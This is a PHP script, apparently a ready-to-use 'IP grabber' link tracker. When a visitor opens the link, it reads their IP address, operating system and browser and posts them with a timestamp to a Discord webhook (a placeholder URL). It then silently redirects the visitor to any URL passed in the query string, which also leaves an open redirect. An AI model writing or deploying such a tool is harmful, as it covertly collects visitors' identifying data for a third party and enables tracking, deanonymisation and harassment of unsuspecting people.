<?php

function getOS($user_agent) {
    $os_platforms = array(
        '/windows nt 10/i'      => 'Windows 10',
        '/windows nt 6.3/i'     => 'Windows 8.1',
        '/windows nt 6.2/i'     => 'Windows 8',
        '/windows nt 6.1/i'     => 'Windows 7',
        '/windows nt 6.0/i'     => 'Windows Vista',
        '/windows nt 5.2/i'     => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     => 'Windows XP',
        '/windows xp/i'         => 'Windows XP',
        '/windows nt 5.0/i'     => 'Windows 2000',
        '/windows me/i'         => 'Windows ME',
        '/win98/i'              => 'Windows 98',
        '/win95/i'              => 'Windows 95',
        '/win16/i'              => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i'        => 'Mac OS 9',
        '/linux/i'              => 'Linux',
        '/ubuntu/i'             => 'Ubuntu',
        '/iphone/i'             => 'iPhone',
        '/ipod/i'               => 'iPod',
        '/ipad/i'               => 'iPad',
        '/android/i'            => 'Android',
        '/blackberry/i'         => 'BlackBerry',
        '/webos/i'              => 'Mobile',
        '/windows phone/i'      => 'Windows Phone'
    );

    foreach ($os_platforms as $regex => $os) {
        if (preg_match($regex, $user_agent)) {
            return $os;
        }
    }
    return 'Unknown';
}

function getBrowser($user_agent) {
    $browsers = array(
        '/msie/i'       => 'Internet Explorer',
        '/firefox/i'    => 'Firefox',
        '/mozilla/i'    => 'Mozilla',
        '/safari/i'     => 'Safari',
        '/chrome/i'     => 'Chrome',
        '/edge/i'       => 'Edge',
        '/opera|opr/i'  => 'Opera',
        '/netscape/i'   => 'Netscape',
        '/maxthon/i'    => 'Maxthon',
        '/konqueror/i'  => 'Konqueror',
        '/mobile/i'     => 'Mobile'
    );

    foreach ($browsers as $regex => $browser) {
        if (preg_match($regex, $user_agent)) {
            return $browser;
        }
    }
    return 'Unknown Browser';
}

function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function logError($message, $severity = 'ERROR') {
    $error_log = '[' . date('Y-m-d H:i:s') . '] [' . $severity . '] ' . $message . PHP_EOL;
    error_log($error_log, 3, 'error.log');
}

function sendRequest($url, $data) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);

    $response = curl_exec($ch);

    if ($response === false) {
        $error_message = curl_error($ch);
        logError("cURL Error: $error_message");
    }

    curl_close($ch);
    return $response;
}

$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? sanitizeInput($_SERVER['HTTP_USER_AGENT']) : 'Unknown';
$user_os = getOS($user_agent);
$user_browser = getBrowser($user_agent);
$ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
$site_refer = isset($_SERVER['HTTP_REFERER']) ? sanitizeInput($_SERVER['HTTP_REFERER']) : 'Direct connection';
$time = date('Y-m-d H:i:s');

$data = array(
    'content' => "$ip | $user_os | $user_browser | $time"
);
$make_json = json_encode($data);

$webhook_url = 'PUT_YOUR_WEBHOOK_HERE'; // Replace with your actual Discord webhook URL
$response = sendRequest($webhook_url, $make_json);

if ($response === false) {
    logError('Failed to send data to Discord webhook', 'WARNING');
}

if (isset($_GET['url'])) {
    $redirect_url = filter_var($_GET['url'], FILTER_SANITIZE_URL);
    header("Location: $redirect_url");
    exit;
}
?>
